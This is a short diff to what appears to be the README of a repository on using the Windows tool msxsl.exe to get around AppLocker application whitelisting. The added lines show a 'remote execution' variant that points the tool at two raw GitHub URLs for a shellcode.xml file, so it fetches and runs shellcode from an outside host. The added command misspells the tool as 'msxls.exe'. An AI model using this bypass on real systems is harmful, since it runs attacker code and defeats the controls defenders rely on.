@@ -11,6 +11,10 @@ https://twitter.com/subTee/status/877616321747271680
 	or
 	
 	msxsl.exe shellcode.xml/JScript.xml/VBScript.xml shellcode.xml/JScript.xml/VBScript.xml
+	
+	or remote execution(Evi1cg told me)，like this:
+	
+	msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
 
 ### shellcode.xml:
 
